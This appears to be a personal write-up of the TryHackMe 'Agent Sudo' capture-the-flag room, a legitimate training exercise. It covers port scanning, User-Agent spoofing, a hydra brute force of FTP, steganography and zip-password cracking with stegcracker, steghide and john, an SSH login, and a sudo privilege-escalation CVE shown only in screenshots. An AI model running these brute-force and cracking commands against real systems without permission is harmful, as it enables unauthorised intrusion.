---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/agent-sudo/","tags":["CTF","write-up"]}
---


![Pasted image 20250107172956.png|300](/img/user/attachments/Pasted%20image%2020250107172956.png)

---

> [!INFO] Info about Agent Sudo
>  You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
>  
>  Your task is simple, capture the flags just like the other CTF room. Have Fun!

> [!FAQ]- Hints
> If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

---
# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

> [!check]- How many open ports?
> 3

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 21,22,80 -oN nmap_enum
```
## OS
Linux, Ubuntu
## Port 22 - SSH
tcp open  ssh     **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (**Ubuntu Linux;** protocol 2.0)
## Port 21 - FTP
tcp open  ftp     **vsftpd 3.0.3**
## Port 80 - HTTP
tcp open  http    **Apache httpd 2.4.29** ((Ubuntu))
![Pasted image 20250107174853.png](/img/user/attachments/Pasted%20image%2020250107174853.png)

> [!check]- How you redirect yourself to a secret page?
> User-Agent

Use a User-Agent swicher pluggin or BurpSuite to change the name of the *User-Agent* to *C*
![Pasted image 20250107191057.png](/img/user/attachments/Pasted%20image%2020250107191057.png)

The server response with a *302* code, so it'will redirect, we need to press on the bottom.
> [!check]  What is the agent name?
> ![Pasted image 20250107191357.png](/img/user/attachments/Pasted%20image%2020250107191357.png)

Now we know that the agent *J* exists and the agent *C*'s password its weak.

---
# Exploitation
Done enumerate the machine? Time to brute your way out.
## Port 21 - FTP
```shell
hydra -f -V -t 64 -l chris -P /usr/share/wordlists/rockyou.txt 10.10.32.160 ftp  
```

> [!check]- FTP password
> ![Pasted image 20250107192438.png](/img/user/attachments/Pasted%20image%2020250107192438.png)

Login and download the files
![Pasted image 20250107192657.png|600](/img/user/attachments/Pasted%20image%2020250107192657.png)

![Pasted image 20250107192926.png](/img/user/attachments/Pasted%20image%2020250107192926.png)

It suggests steganography 
## Steganography
I'll try to brute force the file *cute-alien.jpg* with *stegcracker*
```shell
stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
```
It works

> [!check] steg password
> ![Pasted image 20250108091310.png|600](/img/user/attachments/Pasted%20image%2020250108091310.png)

Extract with *steghide* using the password from above
```shell
steghide extract -sf cute-alien.jpg
```
![Pasted image 20250108091425.png|400](/img/user/attachments/Pasted%20image%2020250108091425.png)
Read the *message.txt*

> [!check] Who is the other agent (in full name)?
> ![Pasted image 20250108091803.png](/img/user/attachments/Pasted%20image%2020250108091803.png)

> [!check] SSH password
> ![Pasted image 20250108091803.png](/img/user/attachments/Pasted%20image%2020250108091803.png)

Extract data from *cutie.png*
```shell
binwalk -e cutie.png
```
![Pasted image 20250108211414.png|500](/img/user/attachments/Pasted%20image%2020250108211414.png)

The file *8702.zip* is password protected, we need to get the hash to crack it.

Get the hash
```shell
zip2john 8702.zip > hash1 
```

Crack the hash
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash1
```

> [!check] Zip file password
> ![Pasted image 20250108213540.png](/img/user/attachments/Pasted%20image%2020250108213540.png)

Extract the file
```shell
7z x 8702.zip
```
We have a new file *To_agentR.txt*, the past file was empty.
![Pasted image 20250108214905.png|500](/img/user/attachments/Pasted%20image%2020250108214905.png)

The code is a base64 code
```shell
echo "Q*****x" | base64 -d
```
![Pasted image 20250108215333.png|300](/img/user/attachments/Pasted%20image%2020250108215333.png)
This is the same password founded above with the tool *stegcracker*
## SSH login
```shell
ssh james@10.10.125.163
```
![Pasted image 20250108103042.png](/img/user/attachments/Pasted%20image%2020250108103042.png)

> [!check] What is the user flag?
> ![Pasted image 20250108103233.png](/img/user/attachments/Pasted%20image%2020250108103233.png)

We also have an image *Alien_autospy.jpg*
Download it and search info to get the flag

> [!check] What is the incident of the photo called?
> ![Pasted image 20250108104443.png](/img/user/attachments/Pasted%20image%2020250108104443.png)

---
# Privilege escalation
## sudo -l
Executing `sudo -l`
![Pasted image 20250108220503.png](/img/user/attachments/Pasted%20image%2020250108220503.png)

Searching info about this.
![Pasted image 20250108220408.png|500](/img/user/attachments/Pasted%20image%2020250108220408.png)
It is our sudo vulnerability and present an exploit to leverage it.
> [!check] CVE number for the escalation
> ![Pasted image 20250108220632.png|600](/img/user/attachments/Pasted%20image%2020250108220632.png)

Execute the exploit
![Pasted image 20250108221059.png](/img/user/attachments/Pasted%20image%2020250108221059.png)

> [!check] Root flag
> ![Pasted image 20250108223652.png](/img/user/attachments/Pasted%20image%2020250108223652.png)

> [!check] (Bonus) Who is Agent R?
> ![Pasted image 20250108223658.png](/img/user/attachments/Pasted%20image%2020250108223658.png)


---
